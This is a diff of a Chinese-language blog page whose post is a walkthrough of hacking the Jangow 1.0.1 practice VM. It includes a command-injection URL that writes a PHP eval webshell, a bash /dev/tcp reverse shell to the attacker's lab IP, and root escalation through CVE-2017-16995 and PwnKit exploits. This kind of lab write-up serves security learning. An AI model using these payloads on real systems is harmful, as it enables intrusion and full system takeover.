@@ -136,45 +136,45 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-23T11:05:24.661Z">2026-01-23</time>
+          最后更新于 <time datetime="2026-04-01T09:28:05.768Z">2026-04-01</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
     </div>
     <div class="post-content">
       <h1 id="ab前置：切换靶机网卡，否则kali扫不到"><a href="#ab前置：切换靶机网卡，否则kali扫不到" class="headerlink" title="ab前置：切换靶机网卡，否则kali扫不到"></a>ab前置：切换靶机网卡，否则kali扫不到</h1><p>启动靶机时点shift停在这个界面</p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4ffa3fe32ba9b5a7f9d9eaa4b0d03694.png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4ffa3fe32ba9b5a7f9d9eaa4b0d03694.png"></p>
 <p>点e进入编辑页面，把ro改成rw signie init&#x3D;&#x2F;bin&#x2F;bash</p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0de242ad27420eaef6c9746bd4b6c1b6.png"></p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5a3e4a19ccb6836dbbdea4e411859405.png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0de242ad27420eaef6c9746bd4b6c1b6.png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5a3e4a19ccb6836dbbdea4e411859405.png"></p>
 <p>Ctrl+x保存，ip a查看网卡信息</p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12ce15660e7ca91ff574b4134db5e815.png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12ce15660e7ca91ff574b4134db5e815.png"></p>
 <p>vim &#x2F;etc&#x2F;network&#x2F;interfaces</p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ac173df15b2ca7cb1f4eab544f605e51.png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ac173df15b2ca7cb1f4eab544f605e51.png"></p>
 <p>把enp0s17改为ens33，保存退出</p>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1.1主机发现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.59.1/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image.png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image.png"></p>
 <p>存活靶机地址为<strong>192.168.59.139</strong></p>
 <p>1.2端口扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.59.139</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(1).png">80端口存在web服务</p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(1).png">80端口存在web服务</p>
 <p>1.3目录扫描</p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(2).png"></p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(3).png"></p>
-<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(4).png">发现传参口并且能执行命令，尝试写入木马</p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(2).png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(3).png"></p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(4).png">发现传参口并且能执行命令，尝试写入木马</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.139/site/busque.php?buscar=echo &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure>
 
 <p>成功连接蚁剑</p>
 <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>利用蚁剑传入反弹shell文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.59.128/443 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">访问执行</span><br><span class="line">在kali开启端口监听</span><br><span class="line">nc -lvnp 443</span><br><span class="line"></span><br><span class="line">注：这里只能使用443端口进行反弹shell，因为靶机的防火墙出站规则过滤了危险端口，</span><br><span class="line">而像443(https)和80(http)通常会开放</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(5).png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(5).png"></p>
 <h1 id="提权（这里有多种方法）"><a href="#提权（这里有多种方法）" class="headerlink" title="提权（这里有多种方法）"></a>提权（这里有多种方法）</h1><h2 id="方法一（内核提权漏洞）"><a href="#方法一（内核提权漏洞）" class="headerlink" title="方法一（内核提权漏洞）"></a>方法一（内核提权漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">#查看内核版本，是否存在内核提权漏洞</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(6).png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(6).png"></p>
 <p>查询资料得知该版本存在内核提取漏洞：</p>
 <p>CVE-2017-16995 (Ubuntu 16.04 BPF 提权)</p>
 <p>操作步骤：</p>
@@ -183,7 +183,7 @@ article: http://ogp.me/ns/article#">
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 45010</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(7).png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(7).png"></p>
 <ul>
 <li>你会找到一个名为 45010.c 的文件。</li>
 <li>传输文件： 在 Kali 上启动一个 Python HTTP 服务，在靶机上用 wget 下载它。</li>
@@ -201,19 +201,19 @@ article: http://ogp.me/ns/article#">
 
 <ul>
 <li>运行后，直接就是 root 了。</li>
-<li><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(8).png"></li>
+<li><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(8).png"></li>
 </ul>
 <h2 id="方法二（SUID提权）"><a href="#方法二（SUID提权）" class="headerlink" title="方法二（SUID提权）"></a>方法二（SUID提权）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#寻找具有root权限的文件</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(9).png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(9).png"></p>
 <p>查找资料发现pkexec有一个漏洞</p>
 <p>CVE-2021-4034</p>
 <p>前往github寻找利用脚本</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/pyhrr0/pwnkit/blob/main/pwnkit.c">pwnkit&#x2F;pwnkit.c at main · pyhrr0&#x2F;pwnkit</a></p>
 <p>下载下来通过蚁剑上传</p>
-<p>根据README来编译使用<img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(10).png"></p>
+<p>根据README来编译使用<img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(10).png"></p>
 <p>运行后拿到root权限</p>
-<p><img src="/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(11).png"></p>
+<p><img src="/images/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(11).png"></p>
 
     </div>
   </article>
@@ -353,14 +353,14 @@ article: http://ogp.me/ns/article#">
                 <div class="category-item">
                     <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
                         内网渗透
-                        <span>(17)</span>
+                        <span>(16)</span>
                     </a>
                 </div>
             
                 <div class="category-item">
                     <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
                         靶机日记
-                        <span>(17)</span>
+                        <span>(16)</span>
                     </a>
                 </div>
             
